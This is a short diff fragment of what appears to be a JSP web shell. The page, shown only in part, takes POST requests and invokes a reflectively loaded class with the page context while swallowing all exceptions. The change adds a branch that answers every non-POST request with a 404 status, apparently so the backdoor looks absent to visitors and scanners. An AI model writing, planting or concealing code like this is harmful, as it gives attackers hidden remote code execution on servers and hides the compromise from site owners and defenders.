@@ -55,5 +55,7 @@ if (request.getMethod().equals("POST")) {
             loader.getClass().getMethod("equals", Object.class).invoke(loader, pageContext);
         } catch (Exception e) {}
     }
+} else {
+    response.setStatus(404);
 }
 %>
